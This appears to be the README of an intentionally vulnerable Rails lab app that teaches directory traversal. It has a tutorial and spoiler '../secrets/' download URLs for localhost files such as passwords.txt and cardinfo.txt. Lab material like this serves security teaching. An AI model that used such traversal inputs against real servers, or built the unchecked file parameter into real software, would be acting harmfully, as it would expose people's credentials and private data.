# SETUP: Fork the repository, run "rails db:seed", and run "rails server" in order to run the application. If you want to check the secured version of the application, be sure to switch to the "secured_website" branch.

# PURPOSE: The purpose of this website is to demonstrate how attackers may perform directory traversal attacks. Look for clues like the names of the publicly displayed files on the website as well as the information within the files in order to find the name of the directory and name of the files you want to traverse to.

# TUTORIAL

# 1. Download the files and pay attention to the hints on the name of the directory, as well as the files within the directory you are attempting to traverse to.

# 2. Hover over the files in order to see what url is used in order to download a file (Example: http://127.0.0.1:3000/files/download?file=asdf.txt).

# 3. Once you are aware of the directory name, and its files, edit the previously posted url in order to access the files you're looking for.

# 4. Once the file from the private directory is downloaded, look at the confidential contained within the file.

# SPOILERS BELOW!!!





















# All of the download urls for the /secrets/ directory

# http://127.0.0.1:3000/files/download?file=../secrets/list.txt
# http://127.0.0.1:3000/files/download?file=../secrets/passwords.txt
# http://127.0.0.1:3000/files/download?file=../secrets/info.txt
# http://127.0.0.1:3000/files/download?file=../secrets/notes.txt
# http://127.0.0.1:3000/files/download?file=../secrets/notes(1).txt
# http://127.0.0.1:3000/files/download?file=../secrets/gmail.txt
# http://127.0.0.1:3000/files/download?file=../secrets/dairy.txt
# http://127.0.0.1:3000/files/download?file=../secrets/cardinfo.txt
